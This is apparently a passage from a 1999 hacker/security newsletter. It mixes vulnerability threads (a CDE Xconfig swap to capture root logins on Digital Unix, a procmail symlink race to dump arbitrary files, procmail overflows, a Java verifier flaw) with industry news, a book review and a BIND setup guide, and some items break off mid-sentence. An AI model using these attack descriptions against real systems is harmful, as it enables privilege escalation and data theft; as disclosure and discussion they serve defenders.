         combine decoy scans and "ME" spoofing like this?  does a decoy/spoof scan
         also decoy/spoof the OSscan? ]
       
       OS scanning
       
       This is the -O option.  To use it requires one open and one closed port.  
       The closed port is picked at random from a high-numbered port.  Machines
       which do packet filtering on high-numbered ports will cause problems with
       OS detection (many sites will filter packets to high numbered ports which
       don't have the ACK bit set).  Also excessive packet loss will cause
       problems with OS detection.  If you run into trouble try selecting an open
       port which isn't being served by inetd (e.g. ssh/22 or
       portmap/rpcbind/111).
       
       OS scanning also reports the TCP sequence number prediction vulnerability
       of the system.  If you're 31337 you will be able to use this to exploit
       trust relationships between this machine and other machines.  There's a
       reasonably decent phrack article on this in phrack P48-14, but you should
       beware that it isn't this easy -- you need to worry about ARP (what's
       that?  how does it work?  i suggest familiarizing yourself with tcpdump)
       and if you're trying to exploit rsh/rlogin you need to worry about
       spoofing the authorization connection as well.

       This problem seems to exist in other versions of Digital Unix, too.
       At least on Digital Unix 4.0c and 4.0d (Factory Installed Software,
       no patches applied, CDE in use) /var, which in my case is a link to
       /usr/var, has
       
       drwxrwxr-x  28 root     system       512 Feb 11 12:58 /usr/var/
       
       permissions. However, on Digital Unix 4.0b (Patch kit DUV40BAS00008-
       19980821 applied, Software installed from CD, CDE in use) /usr/var
       has
       
       drwxr-xr-x  23 root     system       512 Feb 11  1998 /usr/var/
       
       permissions.
       
       >The whole thing is done while executing /sbin/rc3.d/S95xlogin and

       This does not seem to be the case for Digital Unix 4.0c and 4.0d.
       There is no chmod of /var in /sbin/rc3.d/S95xlogin.

       Or do the following:
       CDE's Xconfig file is a link from /var/dt/Xconfig to the actual config
       file. Moving /var/dt and creating your own /var/dt, you could replace
       the system Xconfig file with your own version which has the session
       manager specification
       
       Dtlogin*session:               /usr/dt/bin/Xsession
       
       replaced with something more evil. Then just wait for root to
       log in on the console....

       Subject: Re: Digital Unix 4.0E /var permission
       
               First of all, under Digital UNIX, the system group is the group that is
       'pseudo-root', i.e. have near root privilages and are allowed to su into
       root.  /var, which under a default install, is a sym-link to /usr/var,
       contains all of the system accounting files, LSM, and other system
       specific files that all System Administrators would need to run thier
       system.  So, it is only logical that system have write permissions to that
       directory.
               Also, one should note that any system administrator should (and
       would, I would hope), only put _secure_ accounts in the system group, i.e.
       any account that is going to utilize a safe password and those accounts
       are not going to have set-uid or gid executables attached to them.
               One more note:  as an ls -la of /sbin/rc3.d would show you,
       S95xlogin is only a sym-link to /sbin/init.d/xlogin.  The S95 is there so
       when init comes up to run level 3, it will start (the  S tells it that),
       and the 95 is placed there to put it in order - you add a numeric number
       to the front of the executable, so when the rc3 script processes
       /sbin/rc3.d, it gets launched after certain daemons and programs that need
       to be running in order for it to start. To the best of my knowledge,
       xlogin isnt doing anything to the /var permissions.

       As the person who fixed most of those overflows I suppose I should
       elaborate on this.
       
       First off, for non-debian users, the source to the current procmail
       release can be fetched from:
       
               http://www.procmail.org/procmail.tar.gz
               ftp://ftp.procmail.org/pub/procmail/procmail.tar.gz
       
       PGP signatures can be found next to the those (".sig"), made by the key
       with keyid 0x4A25D351, availible on the keyservers or at
               http://www.procmail.org/pgp-key.html
       
       Mirrors will be announced on the procmail webpage
       (http://www.procmail.org/) as they are confirmed.
       
       
       All versions of procmail previous to 3.12 could overflow heap allocated
       buffers, either when given a sufficiently long command line argument,
       or during expansions while processing procmailrc files.  If the later
       occurs during the processing of /etc/procmailrc on systems where
       procmail is installed setuid root or is run as the local delivery
       agent, root access may be obtainable.  If procmail is installed setgid,
       then the command line overflow exposes that group, but not (directly)
       root.  Overflows that occur while processing user procmailrc files may
       give out setgid and/or that user's access.
       
       
       The details are similar to any other program with heap-allocated buffer
       overflow.  None of overflows directly involved the message being
       processed, but rather were triggered by expansions in the user's
       procmailrc file.  Since only the user can change that, there should be
       no problem...except that:
       
       a) procmail is installed setgid mail on many systems and (depending on
          the spool configuration and system) may not have given up those
          privileges, and
       b) many rcfiles extract data from the message (say, the contents of a
          header, or a snippet of the body) and then use that in later
          conditions.
       
       (a) means that a local user may be able to obtain setgid mail rights,
       while (b) means that remote exploits may be possible.  However, even
       when self-inflicted with no gain, crashing on overflow is just rude.
       
       Closing the overflows has been a matter of simply checking, in the
       correct places, that there's enough space to do what needs to be done.
       While I can't rule out doing so in the future, we have not moved to a
       scheme of dynamically allocating everything, partly because I don't
       have the time to debug such a scheme, and partly because it isn't clear
       that it would even be the right thing to do (think DOS-attacks).
       
       I'm not claiming to have fixed them all -- I've been following this
       list too long to be that stupid -- but we have our eyes open and are
       actively working on catching them when we find them.  Bug reports and
       comments should be sent to <bug@procmail.org>.
       
       I have not heard of or seen any exploits.  (Waste of typing to say that.)

       How apt my previous words...
       
       I have released procmail version 3.13.1, which fixes a few buffer
       overflow that I had missed previously and eliminates a keyword conflict
       with newer versions of gcc.  These buffer overflows are probably
       'slightly more difficult' to exploit as they involve particular
       variables instead of variable expansion in general.
       
       My apologies to those who downloaded version 3.13 yesterday.

       Debian has been notified and so will probably be releasing an updated
       package shortly.  (If other vendors want to be notified of procmail

       Hi,
       
       Well well since Debian appear to have "broken silence" on the procmail
       front rather than wait for an official announcement...
       
       I found something potentially more serious than boring heap overflows. It
       is allegedly fixed in the latest procmail release but I haven't checked.
       
       As a summary local users can dump the contents of any file to screen. As a
       comment I would suggest anyone running procmail with elevated privs either
       
       a) Needs their head examined or
       b) Hasn't read the code.
       
       Here is a quote of a previous mail I sent various people when I first
       found the file handling issue. I also recommended to the procmail team
       that they review _all_ of their file handling code. I have no idea whether
       this recommendation was taken on board or not..
       
       Cheers

       However on to more interesting things, I have found a much more serious
       security hole in procmail's file handling which can lead to users dumping
       the contents of arbitrary files they should not be able to read to the
       screen.
       
       The faulty code sequence is in the handling of .procmailrc files and goes
       something like
       
       1) stat .procmailrc (as root) - if it can't be stat'ed keep root privs
       2) open .procmailrc
       3) do lstat on .procmailrc for security check
       
       By replacing .procmailrc after steps 1) and 2) with a symlink to the file
       to dump and a regular file respectively, we can win a race condition.
       
       You might not think this is a very plausible race but with a few deep
       directory/multiple symlink tricks/SIGSTOP/etc. the window can be made
       quite wide. This is definitely exploitable.

       Procmail is generally not useful when running on behalf of the person
       who wrote the email it's being given as input.
       
       When it is running on behalf of someone else, which is the usual case,
       it has privileges that the sender did not.
       
       In my book, that means it's running with elevated privs.
       
       Common examples of this situation:
       - filtering your incoming mail with procmail
       - running a mailbox (of mail from other people) through procmail

       Hmm, I guess I failed to cc you on the discussion that later took place
       on this issue.  What we eventually settled on and was incorporated into
       version 3.12 was for procmail to always open user rcfiles as the user
       (/etc/procmailrc will still be opened and processed as root).  On some
       systems where special group privileges are needed to deliver to the
       mailspool but that have broken set*gid() system calls, procmail will
       attempt the open as root and if it succeeds then it'll close it, become
       the user, and open it again.  This last case may still allow for DOS
       attacks by symlinking to, say, a serial device that blocks on open, so
       I suppose the open as root should be a non-blocking open.  The truly
       paranoid will abolish the central mailspool directory and group 'mail'
       in favor of spooling mail to the user's home directory, a setup
       procmail readily supports.
       
       As for the rest of the file handling code, what I've had the time to
       review has looked safe.  Procmail becomes the user before it starts
       processing the contents of the $HOME/.procmailrc, so problems should be
       limited to what the user could have done without procmail at all.
       While the permissions of the $HOME/.procmailrc are checked closely,
       procmail tries to the trust the user the rest of the time; if the user
       wants to process recipes from someone else's rcfile, procmail will let
       them: trusting the other user was their explicit choice.  Resource
       consumption attacks (say, opening /dev/zero as an rcfile) should be
       dealt with like all resource consumptions attacks: audit and keep a
       baseball bat next to your desk.

               Not quite true.
               The procmail rule:

               will, in fact, pop a shell from the secured mail server to whereever
       the user specifies, running as the user.  So if they control their own
       .procmailrc, they can log into the mail server whenever they desire, which
       may not be a machine that they would normally have access to.  The paths
       may need to be changed to reflect the OS of the mail server.
               I have patched my procmail to deal with this by forcing it to use
       smrsh.  In doing so, I also discovered the procmail calls sendmail
       explicitly at some point in it's operation (didn't take the time to figure
       out where it does it).  This might also be of concern, but it wasn't
       immediately obvious to me how this might be exploited.

  38.0 Security hole in Java 2 (and JDK 1.1.x)
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       
       Date: Mon, 5 Apr 1999 08:56:10 -0400

       Subject: Security Hole in Java 2 (and JDK 1.1.x)
       
       Hi all,
       
       Karsten Sohr at the University of Marburg in Germany (email
       sohr@mathematik.uni-marburg.de) has discovered a very serious security
       flaw in several current versions of the Java Virtual Machine,
       including Sun's JDK 1.1 and Java 2 (a.k.a. JDK 1.2), and Netscape's
       Navigator 4.x.  (Microsoft's latest JVM is not vulnerable to this
       attack.)  The flaw allows an attacker to create a booby-trapped Web
       page, so that when a victim views the page, the attacker seizes
       control of the victim's machine and can do whatever he wants,
       including reading and deleting files, and snooping on any data and
       activities on the victim's machine.
       
       The flaw is in the "byte code verifier" component of the JVM.  Under
       some circumstances the verifier fails to check all of the code that is
       loaded into the JVM.  Exploiting the flaw allows the attacker to run
       code that has not been verified.  This code can set up a type
       confusion attack (see our book "Securing Java" for details
       http://www.securingjava.com) which leads to a full-blown security
       breach.
       
       We have verified that the flaw exists and is serious.  Attack code (in
       both applet and application form) has been developed in the lab to
       exploit the flaw.  Sun and Netscape have been notified about the flaw
       and they are working on a fix.
       
       The attack we developed in the lab worked against the following platforms:
       JDK 1.1.5 (Solaris)
       JDK 1.2beta4 (Solaris)
       JDK 1.1.6 (Solaris)
       JDK 1.1.7 (FreeBSD)
       JDK 1.2 (NT)
       JDK 1.1.6 (NT)
       Symantec Visual Cafe Version 3
       Netscape 4.5 (FreeBSD)
       Netscape 4.5 (NT)
       Netscape 4.05 (NT)
       Netscape 4.02 (Solaris)
       Netscape 4.07 (Linux)
       
       The attack did not work against:
       Microsoft Visual J++ 6.0
       
       Kudos to Viren Shah at RST for extensive platform testing.  Thanks for
       your interest in mobile code security.

       SUN SET TO DELIVER SOFTWARE FIX
       FOR JAVATM DEVELOPMENT KIT
       SECURITY BUG 
         


      PALO ALTO, Calif. -- March 26, 1999 -- Sun
      Microsystems, Inc. today announced it has created a
      fix to a newly discovered implementation bug in the
      JavaTM Development Kit (JDKTM) that affects both
      JDK 1.1.x and the Java 2 platform. The bug poses a
      potential security risk by allowing an untrusted applet to
      execute unverified code under certain circumstances.
      There are no reports of any attacks based on this bug. 

      After being briefed on the bug, Sun created and tested
      a fix. Releases of the patch for all Java 1.1.x platforms
      and the Java 2 platform are imminent. The fix will also
      be available as a part of JDK 1.1.8 and Java 2, v
      1.2.1, both scheduled for release in April. 

      The bug was discovered by a German graduate student
      as part of a research project and was reported to Sun
      on March 11, 1999 by Ed Felton, who heads the
      Princeton University Secure Internet Programming Lab.

      "It is important to keep in mind that this is an implementation bug and not a
      flaw in the basic Java platform security model or architecture," said Jon
      Kannegaard, Vice President and General Manager, Java Platform at Sun
      Microsystems Java Software. "We invite scrutiny from the Internet
      community and publish our source code so that the community will be able
      to analyze our security implementations and give us valuable feedback on
      the architecture and our implementation. We firmly believe that this is the
      best way to evolve the Java platform security model in this spirit of
      openness." 

      Kannegaard continued, "Sun takes every security-related implementation
      flaw in Java code very seriously and we thank the Princeton team for their
      contribution to the Java platform."

  39.0 Salon buys The Well
       ~~~~~~~~~~~~~~~~~~~
       
       Salon Buys The Well
       Wired News Report 
       
       9:10 a.m.  7.Apr.99.PDT
       Internet magazine Salon has acquired The Well, one of the Net's oldest 
       and most respected online communities. 
       
       The surprise move, announced Tuesday, gives Salon a dose of new credibility
       by tying it directly into a members-only community of scores of artists,
       writers, thinkers, scientists, programmers, and visionaries. 
       
       Salon said the company intends to operate the Sausalito, California company 
       as a separate business. Terms of the deal were not disclosed. 
       
       Well executive director Gail Williams said the deal does not include Well
       Engaged Discussions Server, which remains a separate business owned by
       former Well parent Rosewood Stone Group. That proprietary software allows
       Picospan, the Well's underlying discussion thread software, to be
       viewable on the Web. 
       
       "The Well will provide Salon with new revenue sources, in addition to our 
       advertising, e-commerce, and syndication business," said Salon president
       and publisher Michael O'Donnell in a statement. 
       
       Logic would dictate that Well Engaged would likely replace the clunky software 
       platform underlying TableTalk, Salon's existing discussion forum area.
       But Salon spokesperson Dayna Macy flatly denies this will occur. 
       
       Still, the deal is really about tapping the credibility of a Net institution. 
       
       "The main thing about The Well is not the Web interface, it's the old fashioned
       text interface," said David Gans, who has been a member of The
       Well since 1986. 
       
       "I hope that they don't do anything to make it harder for us old guard to use that." 
       
       Gans said that many members of Salon's staff, including vice president and senior
       editor Scott Rosenberg, and author and reporter Andrew Leonard, are longtime Wellheads. 
       
       "They are not the kind of people who are going to come in and make lots of changes
       just because they can." 
       
       Gans said that many Well members were dissatisfied with the service's current owner,
       Bruce Katz, and would likely embrace the new parent. He said that Well CEO Katz had 
       been trying to sell The Well for years, but had been asking for too much money. 
       
       "If we are going to be bought by someone, Salon seems as good as anyone to do it." 
       
       Other Wellheads seemed pleased, and a discussion raged on a topic in one of the service's
       conferences. 
       
       "I think it could be very promising," said Reva Basch, a Wellhead since 1988. 
       
       "One of the big questions in my mind is where are the deep pockets? But culturally and
       conceptually it could be really interesting," said Basch. 
       
       Well director Williams played down persistant rumors that the service's selling price had 
       been overinflated. 
       
       "The popular perception is different than the business perception," Williams said. "How many
       businesses on the Web have as strong an identification and revenue [as the Well has]?" 
       
       "We're dancing on our keyboards over here," Williams said. 
       
       In a prepared statement, Salon's founder described a match made in heaven. 
       
       "The Well's distinctive reputation for thoughtful and intelligent online discussions fits 
       strongly with our network of high-quality content sites and our existing community, Table Talk,"
       said David Talbot. 
       
       The Well has come to be an intellectual safe-haven for many of the leading thinkers of the 
       digital age. 
       
       Editor's Note: This story has been corrected. The original report speculated that Well Engaged
       software could possibly replace the Salon discussion area known as Table Talk. In fact, that 
       platform can only replace the software underlying that discussion forum, and not the forum
       itself. Wired News regrets the error.

  41.0 Network Associates unveils middleware

     Network Associates unveils middleware 
     By Tim Clark
     Staff Writer, CNET News.com
     April 5, 1999, 9:45 a.m. PT 

     update Seeking to simplify security management, Network Associates today rolled out middleware
     for securing corporate networks against computer viruses, outside intruders, and internal hackers. 

     Network Associates, which built its security product line through a series of acquisitions, also
     is rolling out additions to its security software lineup and releasing new versions of its existing
     security products. 

     The company is stopping short of a full, centralized console that a security administrator could 
     use to control all aspects of a corporation's network security. Instead, Network Associates is 
     offering middleware, called Event Orchestrator, which coordinates how different pieces of its 
     software communicate with each other. 

     For example, the security middleware could transfer information about an attack, detected by Network 
     Associates' CyberCop intrusion-detection software, to a Gauntlet firewall that could shut off the 
     entryway the attacker was using. 

     Among the new offerings: Client virtual private network (VPN) software that allows remote users to
     dial in securely to corporate networks over the Internet, instead of using dedicated lines or toll
     -free phone numbers. The VPN client is part of a new PGP VPN suite, named after one of the company's
     early acquisitions, Pretty Good Privacy. The suite includes VPN server software, the  company's 
     Gauntlet firewall, and a public key infrastructure (PKI) for issuing and managing digital certificates. 

     The new VPN client, designed for mobile users or extranet connections with business partners, is built
     on PGP desktop encryption software that scrambles data sent via email or stored securely in files or 
     on disks. 

     The VPN suite is part of the "Active Security" suite that Network Associates is unveiling before
     today's opening day baseball game of the Oakland As against the New York Yankees, scheduled
     this evening in the newly renamed Network Associates Coliseum in Oakland. 

     Network Associates also released version 5.0 of its Gauntlet firewall and CyberCop 5.0, its intrusion
     protection product that includes Sting, a decoy that lures hackers into parts of a network where they
     can be detected and caught. 

     Network Associates also announced security partnerships with Microsoft for its proxy server and
     Windows 2000, Hewlett-Packard, Sun Microsystems, public key infrastructure firms Entrust, and
     VeriSign, Cigna, and systems integrators Ernst & Young, PricewaterhouseCoopers, KPMG, and
     GTE Government Systems. 

        Network Associates began as an anti-virus software vendor, and its MacAfee anti-virus products are
     widely used. After merging with Network General in late 1997, the company changed its name to Network        
     Associates and continued to acquired security companies and their products, including encryption firm 
     PGP, firewall maker Trusted Information Systems, European antivirus vendor Doc Solomon, and intrusion
     -detection firm Secure Networks. 

     But Network Associates' "suite strategy"--in which it offers a full line of security software--has 
     drawn criticism. 

     In a Forrester Research report published in late 1998 the research firm argued that "security suites 
     are nothing more than point products cobbled together. By the time vendors properly integrate them, a
     shift in Fortune 1000 security buying patterns and security requirements will conspire to make monolithic
     suites irrelevant." 

     Critics have contrasted the security suite strategy with the "best of breed" approach taken by other 
     vendors who create individual products in separate security technologies. In recent months, Network 
     Associates executives have been calling its offerings "a best-of-breed security suite."

       There is a great deal of information on security contained within this
       book.  Unfortunately, it is presented without a cohesive framework.  The
       overall impression is good.  A lot of the forms that would make up a
       useful work are followed, such as a summary (rather ironically, in view of
       the scattered nature of the text, called "Putting It All Together") and a
       set of resources at the end of every chapter.  The author seems to be
       easily distracted, continually jumping to the next, more sensational,
       topic. 
       
       
       Although not divided into parts, the contents do have some logical
       divisions.  Initially, we are presented with what seems to be intended as
       background material, although the scattergun approach leaves all of the
       synthesis up to the reader.  Chapter one is a rather unfocussed
       introduction, talking as much about Internet technologies as about
       security.  Errors are rather common, ranging from chunks missing out of
       sentences to figures with no cutlines to security weaknesses that are
       essentially duplicates of each other to mailing lists that haven't
       distributed material for years (with contact addresses that are even
       older).  Theoretically the networking concepts and details in chapter two
       might aid in understanding system vulnerabilities, but in the fact of the
       book they do not seem to be used effectively.  The discussion of firewalls
       does not provide sufficient information about either the needs,
       weaknesses, or possible inconveniences of the different types in chapter
       three.  The material on encryption, in chapter four, mentions a number of
       the currently important standards, but the explanations are so flawed that
       the chapter could not be used to inform a decision on the strength or use
       of a cryptographic system. Material on the use of digital signatures is
       fairly short, and the remainder of chapter five rehashes, with really
       expanding, old ground. 
       
       
       Another section tries to delve into more networking protocols.  Chapter
       six, on HTTP (HyperText Transfer Protocol), is somewhat disjointed, and,
       again, fails to seriously examine the security implications.  S-HTTP
       (Secure HyperText Transfer Protocol), in chapter seven, deals mostly with
       packets and commands, although it does have some limited discussion of
       function.  The Secure Socket Layer (SSL)  seems to look primarily at
       arcana rather than use. 
       
       
       Chapter nine looks at a few common forms of attack, but presents
       information somewhat at random.  Kerberos is reasonably well described in
       chapter ten.  Some types of electronic commerce technology are mentioned
       in chapter eleven.  There is an extremely limited look at auditing in
       chapter twelve, first for UNIX and then for NT.  A very rough look at
       security issues within the Java programming language makes up chapter
       thirteen.  Chapter fourteen's look at viruses has good basic explanations,
       but is unreliable in practice. 
       
       
       The remaining chapters generally look at security for specific systems. 
       Chapters fifteen to seventeen very quickly talk about individual security
       functions in NT, NetWare, and UNIX, but fail to analyze, for example, the
       effective rights granted by combinations of the different privilege
       granting mechanisms.  SATAN (System Administrator's Tool for Analyzing
       Networks) for UNIX and Kane Security Analyst for NT get quick overviews in
       chapter eighteen. Chapter nineteen presents a number of security
       vulnerabilities with the Netscape and particularly the Internet Explorer
       Web browsers.  CGI (Common Gateway Interface) form weaknesses are
       discussed in chapter twenty, but with so many different languages that the
       ultimate advice is simply don't make a mistake when programming. 
       
       
       The final chapter is a reasonable look at security policies.  However,
       with some many items missing from the background provided, the chance of
       producing a good policy at this point is relatively small. 
       
       
       As with "Maximum Security" (cf. BKMAXSEC.RVW), this book attempts to cover
       the enormous field of security by throwing out as many bits as possible. 
       Therefore large holes are apparent in the coverage.  In addition, the book
       lacks an overall framework that could be used to build a security
       structure and point the way to vulnerabilities that were not addressed. 
       For those who already are well comfortable with security as a concept,
       this volume does have a lot of references that might be of use.  For those
       new to the topic, it is not reliable enough to start with.

  43.0 The Year Of PKI (Public Key Infrastructure
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

       The year of PKI
       
       
       The growing need for secure Web transactions will
       boost PKI implementations at Entrust Technologies
       By Matthew Nelson
       
       
       Network security has become a necessity with the spread of Internet
       commerce and the expansion of intranets to larger extranets. But with
       differing network systems, secure connections that are constantly updated
       can be a difficult proposition.  One possible solution is the use of
       public key infrastructure (PKI)  systems and digital certificates. To
       discuss PKI and what it means for the enterprise, InfoWorld Senior Writer
       Matthew Nelson recently sat down with John Ryan, chief executive officer
       of Entrust Technologies, one of the leading PKI system providers. 
       
       
       InfoWorld: Do you consider 1999 the year of PKI? 
       
       
       Ryan: There's no question that the recognition by companies that they will
       all need a PKI is now upon us, and we're seeing incredible acceleration of
       pilot activity and recognition across our customer base. So I think this
       year will be the year where people recognize they will definitely have a
       PKI in their enterprise and start the methodical planning to ensure they
       pick the right one. 
       
       
       InfoWorld: Why is PKI seeing adoption now when it is a technology that has
       been around for quite awhile? 
       
       
       Ryan: Not unlike the Internet [that] was around for almost 20 years before
       all of a sudden it took off, there's been some fundamental things that
       happened in the enterprise that have now driven the need, and made it a
       lower risk decision for the enterprise. The first was certificates, or PKI
       capabilities, which were embedded in the browsers. The next thing that
       happened was the major 20 vendors in the networking world -- the whole
       crew in networking and firewalls -- all standardized around a standard
       called IP SET [Secure Electronic Transaction], which includes digital
       certificates. So basically, each application in an enterprise now, or the
       major applications of an enterprise backbone, are including security as a
       fundamental element, which is forcing companies to consider a public key
       infrastructure. 
       
       
       InfoWorld: What developments should IT managers expect to see during the
       next year? 
       
       
       Ryan: I think you're going to see a much more wide-scale enablement of
       applications, which really is going to make it much simpler for the
       enterprise to install a PKI, because the applications will be ready to
       accept it. 
       
       
       I also think you're going to see networks of trust being created. I think
       one of the first ones we saw was the banking community with their global
       trust organization, which is a high-value, high-trust network for
       Web-based electronic transactions. 
       
       
       InfoWorld: Is there a problem with interoperability between different
       companies' digital certificates? 
       
       
       Ryan: Fortunately, the industry standards that enable interoperability
       have now passed. But actually, we now can support interworking with
       VeriSign, GTE, Microsoft, Netscape, and others, today, in our product. So
       we actually do have full interoperability in our product and we can create
       webs of trust that include VeriSign or GTE certificate authorities, webbed
       with an Entrust certificate authority, into a network of PKI networking. 
       And we really see that as an innovation that the market has not yet
       anticipated. The evolution will then give customers choices and the
       ability to scale their networks based on what they've bought to date. 
       
       
       InfoWorld: Has that interoperability created a different kind of
       competition between Entrust and your competitors? 
       
       
       Ryan: We have always worked with large enterprises and basically delivered
       a guaranteed security system that they could buy and integrate every
       application into it, and have single sign-on and consistent policies and
       practices. 
       
       
       Our competitors are more focused around the authentication market. They
       don't provide encryption or digital signature, they really count on all
       the various applications to embed that technology.  So we really don't
       compete that often, head-to-head. But I think you'll see, as we migrate
       through this year, a much larger movement with our service provider
       program. 
       
       
       We have partnerships with many service providers, which are more analogous
       to the VeriSign model, but with the full Entrust product suite, combined
       with our ability to implement Entrust Worldwide, a global network that
       we've just created. We'll be able to create really hybrid PKI networks
       where a piece of the PKI is on the customer's premises, and controlled by
       them. 
       
       
       Another piece of the PKI might be controlled by a service provider, and we
       can connect them together seamlessly to be able to enable PKI networking
       and then extend that web of trust to other companies, so that you can
       create a community of interest to conduct electronic commerce. 
       
       
       InfoWorld: If digital certificates are all going to interoperate, how are
       companies going to differentiate themselves from their competitors? 
       
       
       Ryan: That part is going to be an exciting revolution because it will
       evolve very similarly to the credit card business, and I believe that the
       card or the certificate will become a brand position. I might have a
       Citibank Certificate just like I have a Citibank MasterCard. 
       
       
       And I can see that there will be a battle for that identity, and I really
       believe you're going to find there are credentials that you can use across
       a number of services, and that credential may be issued by a bank, or a
       telephone company, or a government. And then I think that most
       organizations who really care about branding and positioning will issue
       certificates to their customers. So a person will end up with probably the
       same number of certificates as they have credit cards. 
       
       
       InfoWorld: Do you think the cessation of year-2000 projects is going to
       have an effect on the adoption of security products and specifically PKI
       systems? 
       
       
       Ryan: Certainly there's no doubt, it's a very critical element that's on
       the mind of every CIO. I think it's helping accelerate PKI in the first
       six months of the year because I think behind year 2000, many of our
       corporate customers are telling us security is the next, No. 2 critical
       item. And they have to get it fixed, but they want to get going right
       away, before the latter part of the year comes when they're fearful that
       they're going to be a little bit busy with year-2000 testing, if they
       haven't got there yet. 
       
       
       In the second half of the year, we've pretty much said it could slow down
       as far as implementation goes. But we actually think that people are going
       to solve a lot more of the problem than they thought, and are actually
       going to be in a position to have the ability to buy the technology for
       implementation in the year 2000. 
       
       
       We're cautiously optimistic right now, but we actually see it as an
       accelerator in the short term, and then we'll be waiting and seeing what
       happens. We also have seen though -- without doubt -- once the year-2000
       bug is done, everybody has said security will become the next No. 1
       priority. So I think that that speaks well for the position that we see
       emerging in the enterprises.

       Featured Articles: DNS and BIND  
             
             from http://www.freebsdzine.org/199902/features/dns.shtml

       ## DNS and BIND
       ## Damon Slachter [ razorz@jagged.net ]

       With domain names becoming the "thing to have" these days, some people are feeling left out. If you are one of those people
       this article just might be for you. I will be concentrating on the BIND implementation of DNS and hopefully, by the end of
       reading this you will have a fully functional bind server. 

       What is BIND? 

       BIND (Berkeley Internet Name Domain) was written by Kevin Dunlap for the 4.3BSD UNIX operating system as a
       implementation of the Domain Name System, or DNS. Since its early release for 4.3BSD, BIND has been ported to virtually
       all flavors of UNIX and Microsoft Windows NT. BIND has since been maintained by the Internet Software Consortium. 

       Before we start I will be assuming you know basic unix commands such as ls, cd, cp, mkdir and others like it. If not, my best
       advise is to stick around in #FreeBSD on Undernet more often or find a basic unix tutorial. With this being said, your ready to
       enter the realm of DNS/Bind. 

       Installing the bind8 server is a simple task and can be achieved by doing the following, 

               # cd /usr/ports/net/bind8
               # make
               # make install

       By executing these few commands you tell the makefile to download the source for bind8, compile it and then install it. Now
       that the Bind server is installed, we get into the config files themselves. 

               # cd /etc
               # ls

       In the /etc directory you should have the file named.conf, if not lets make one, if so you must edit it anyhow. 

          options {
          directory "/etc/namedb/";  // Config file directory
          };

          zone "jagged.net" in {  // Domain you control/own
          type master;
          file "db.jagged";    // the file used for domain config
          };

          zone "159.243.207.in-addr.arpa" in {  // IP address 207.243.159.x
          type master;
          file "db.207.243.159";       // Again, file that controls this
          };

          zone "0.0.127.in-addr.arpa" in {  // Local loop zone
          type master;
          file "db.127.0.0";   // file controlling this IP field
          };

          zone "." in {                // Default, root name servers
          type hint;  
          file "db.cache";     // Cache file of Internic NS's
          };

       Thats basically it for the /etc/named.conf file, here are a few pointers. 

       Pointers for named.conf 

               zone "159.243.207.in-addr.arpa" in {

       This line will be used for reverse information on the Class C IP block of 207.243.159.0/24. Do not use 159.243.207, use your
       actual IP address block, minus the last number. 

       Now its time to get the actual domain database files (ie: db.jagged) setup. 

               # cd /etc
               # mkdir namedb
               # ls

       You will need to ftp to rs.internic.net/domain/ and download named.root and then rename the file as db.cache and your good to
       go. 

       This is where the reverse names for your IP's are created. 

       In the /etc/namedb dir use your favorite editor, may it be vi, ee or pico and make 3 files. 

               # pico db.127.0.0

       In db.127.0.0 file you need the following: 

       @ IN SOA ns1.jagged.net. ns2.jagged.net. (
               1         ; Serial #
               10800     ; Refresh after 3 hours
               3600      ; Retry after 1 hour
               604800    ; Expire after 1 week
               86400 )   ; Minimum TTL of 1 day

               IN NS ns1.jagged.net.
               IN NS ns2.jagged.net.

       1 IN PTR localhost.

       The "IN NS nsX.jagged.net." lines can be replaced by your dns server's hostname such as sun.jagged.net. or
       hellspawn.jagged.net. You can also put your ISP's nameserver as the secondary one. 

       ***** TIP: The serial # must be changed every time you edit the file if you want your records to be correctly updated. You can
       also create serial number in the YYYYMMDDTTTT format (Year, Month, Date, Time: 199901210230 or 9901210230
       ****** 

       Next, 

               # pico db.207.243.159

       207.243.159 would be replaced by your actual IP address, not the full address only the first 3 #'s. 

       @ IN SOA ns1.jagged.net. ns2.jagged.net. (
               1       ; Serial
               10800   ; Refresh after 3 hours
               3600    ; Retry after 1 hour
               604800  ; Expire after 1 week
               86400 ) ; Minimum TTL of 1 day

               IN NS ns1.jagged.net
               IN NS ns2.jagged.net.

       93      IN PTR  jagged.net.

       This is the file where you will specify the reverse DNS for your internet IP address. In most cases you will not have reverse
       delegation over your IP (the ability to set this yourself), but you need to set it up anyways. 

       The line 93 IN PTR jagged.net. is the actual line that specifies what this IP will reverse as, example: 

               > nslookup 207.243.159.93
               Server:  jagged.net
               Address:  207.243.159.93

               Name:    jagged.net
               Address:  207.243.159.93

       For a user with only a hostname such as sun.jagged.net you would just use 93 IN PTR sun.jagged.net. 

       Now comes the fun part, creating your hostnames! 

               # pico db.jagged

       Where jagged is the name of YOUR actual domain or the hostname your ISP has set for you, i.e.: sparcstation.jagged.net. You
       may still use the db.jagged file for this but you must specify sparcstation.jagged.net in the /etc/named.conf file. 

       @ IN SOA ns1.jagged.net. ns2.jagged.net. (
               1       ; Serial
               10800   ; Refresh after 3 hours
               3600    ; Retry after 1 hour
               604800  ; Expire after 1 week
               86400 ) ; Minimum TTL of 1 day

               IN NS ns1.jagged.net.
               IN NS ns2.jagged.net.

       localhost       IN A    127.0.0.1
       jagged.net.     IN A    207.243.159.93

       ns1             IN CNAME        jagged.net.
       ns2             IN CNAME        jagged.net.
       ftp             IN CNAME        jagged.net.
       mail            IN CNAME        jagged.net.
       www             IN CNAME        jagged.net.

       jagged.net.     IN MX   mail.jagged.net.

       Here is a brief explanation of what these lines mean. 

               jagged.net.     IN A    207.243.159.93

       This is the forward lookup for the jagged.net domain. 

                www    IN CNAME        jagged.net.

       This creates a "sub domain" or hostname off the root domain jagged.net. 

       The "IN MX" feature of BIND can only be described using a scenario like the following. 

       Imagine you are a network admin and your company needs a separate server just for email. Sure, no problem, but now people
       have to send email to foobar@mail.jagged.net. This isn't a problem but foobar@jagged.net looks much better to you and your
       boss so you do the following: 

               jagged.net.     IN      MX      mail.jagged.net.

       Meaning the "Mail Exchange" jagged.net. points to mail.jagged.net. This command gets much more complicated so I will stop
       here. 

       Now that all of your config files are ready you can now start the bind server. 

               # /usr/local/sbin/named

       This starts the named server. 

       ***** TIP: If you make changes to your db files just use the command
             killall -HUP named to reload your named server. ******

       Now you are ready to test out your named server for the first time. You might want to change /etc/resolv.conf so it points to
       your name server: 

               domain  JAGGeD.net
               nameserver 207.243.159.93

       Type nslookup and you should see something along the lines of 

               > nslookup
               Default Server:  jagged.net
               Address:  207.243.159.93

               >

